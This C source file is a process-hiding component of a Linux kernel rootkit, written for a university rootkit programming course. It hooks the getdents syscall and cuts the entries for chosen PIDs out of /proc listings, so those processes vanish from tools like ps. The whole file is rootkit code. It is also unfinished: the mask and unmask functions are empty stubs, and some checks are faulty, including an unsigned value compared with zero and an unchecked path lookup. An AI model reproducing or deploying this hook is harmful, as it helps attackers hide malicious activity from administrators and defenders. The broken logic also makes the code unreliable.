
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: process_masking.c                                               */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit process_masking: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define PRINT_PID(pid) printk(KERN_INFO "rootkit process_masking: masking process %d\n", (pid))
#define DEBUG_PRINT_PID(pid) if (show_debug_messages) PRINT_PID(pid)
#define PIDS_BUFFSIZE 8   //TODO: to be deleted


/* Definition of data structs */
struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};


/* Definition of global variables */
static int show_debug_messages;
static unsigned long proc_ino;
asmlinkage int (*pm_original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);   //TODO: should point to original_getdents
static int pids[PIDS_BUFFSIZE];   //TODO: to be deleted
static int pids_count;   //TODO: to be deleted


/* Declaration of functions */
int process_masking_init(int);
int process_masking_exit(void);

asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);

void mask_process(pid_t);
void unmask_process(pid_t);

static unsigned long get_inode_no(char *);
static int should_mask(pid_t);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function */
int process_masking_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	proc_ino = get_inode_no("/proc");
	if (proc_ino < 0)
		return 1;

	DEBUG_PRINT("initialized");

	return 0;
}


int process_masking_exit(void)
{
	DEBUG_PRINT("exited");

	return 0;
}


/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int process_masking_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int nread;
	int nread_temp;
	int pid;
	char *endptr;

	/* Call original getdents_syscall */
	nread = pm_original_getdents_syscall(fd, dirp, count);

	if (dirp->d_ino != proc_ino)
		return nread;

	nread_temp = nread;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;

		pid = simple_strtol(dirp->d_name, &endptr, 10);
		if (pid && should_mask(pid)) {
			DEBUG_PRINT_PID(pid);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			nread -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return nread;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}


void mask_process(pid_t pid)
{
	//TODO: to be implemented
}


void unmask_process(pid_t pid)
{
	//TODO: to be implemented
}


/* Function that gets the inode number of the file found under specified path */
static unsigned long get_inode_no(char *path_name)
{
	unsigned long inode_no;
	struct path path;
	struct inode *inode;

	inode_no = -1;

    kern_path(path_name, LOOKUP_FOLLOW, &path);
    inode = path.dentry->d_inode;
	inode_no = inode->i_ino;

	return inode_no;
}


/* Function that checks whether we need to mask the specified pid */
//TODO: to be updated
static int should_mask(pid_t pid)
{
	int i;

	for (i=0 ; i<pids_count ; i++)
		if (pids[i] == pid)
			return 1;

	return 0;
}

